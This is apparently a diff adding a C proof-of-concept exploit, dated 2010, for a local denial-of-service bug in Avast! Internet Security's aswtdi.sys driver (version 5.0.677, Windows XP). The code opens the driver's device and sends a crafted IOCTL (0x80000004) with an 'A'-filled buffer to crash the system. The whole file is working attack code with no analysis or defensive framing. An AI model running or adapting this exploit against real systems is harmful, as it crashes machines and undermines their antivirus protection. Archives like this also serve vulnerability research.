@@ -1,0 +1,66 @@
+/*
+# Exploit Title: Avast! Internet Security aswtdi.sys 0day Local DoS PoC
+# Date: 2010-11-04
+# Author: Nikita Tarakanov (CISS Research Team)
+# Software Link: http://www.avast.com
+# Version: up to date, version 5.0.677, aswtdi.sys version 5.0.677
+# Tested on: Win XP SP3
+# CVE : CVE-NO-MATCH
+# Status : Unpatched
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <io.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <errno.h>
+#include <share.h>
+
+
+int main(int argc, char **argv)
+{
+    HANDLE   hDevice;
+    DWORD    cb;
+    void        *buff;
+    int len = 0;
+    int pfh;
+    int outlen = 0, inlen = 0;
+    DWORD ioctl = 0x800515A8;
+    char deviceName[] = "\\\\.\\aswTdi";
+
+    if ( (hDevice = CreateFileA(deviceName,
+                          GENERIC_READ|GENERIC_WRITE,
+                          0,
+                          0,
+                          OPEN_EXISTING,
+                          0,
+                          NULL) ) != INVALID_HANDLE_VALUE )
+    {
+        printf("Device  succesfully opened!\n");
+    }
+    else
+    {
+        printf("Error: Error opening device \n");
+        return 0;
+    }
+
+    cb = 0;
+    buff = malloc(0x2000);
+    if(!buff){
+      printf("malloc failed");
+      return 0;
+    }
+    memset(buff, 'A', 0x2000-1);
+    ioctl = 0x80000004;
+    inlen = 4;
+
+    outlen = 4;
+    DeviceIoControl(hDevice, ioctl, (LPVOID)buff, inlen, (LPVOID)buff,
+outlen, &cb, NULL);
+    free(buff);
+
+    printf("done!");
+}
